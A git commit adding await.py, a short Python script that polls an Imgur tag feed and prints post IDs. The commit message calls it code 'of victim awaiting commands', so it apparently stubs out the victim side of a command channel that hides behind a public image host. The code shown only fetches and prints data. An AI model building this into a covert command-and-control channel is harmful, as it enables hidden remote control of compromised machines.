7b13f95928415e5784f801dd10516b04ae259b8e
bilk0h <bil.koh.sec@gmail.com>
2021-05-05 10:15:31 -0700

    Added await.py - runs of victim awaiting commands.

---
+++ await.py
@@ -0,0 +1,20 @@
+import requests
+import json
+
+url = "https://api.imgur.com/post/v1/posts/t/a8a15930df81?client_id=3ce591f6a7c61b2&filter%5Bwindow%5D=week&include=adtiles%2Cadconfig%2Ccover&page=1&sort=-viral"
+res = requests.get(url).content
+print(res)
+print("=====")
+data = json.loads(res)
+
+if "errors" in data:
+    print("Errors:", data["errors"])
+elif "posts" in data:
+    print(json.dumps(data["posts"], indent=2))
+
+    for i in data["posts"]:
+        print(i["id"])
+else:
+    print("Unknown Error:", data)
+
+# to download an image w/ ID use https://imgur.com/download/53i9bwZ/imgur_upload
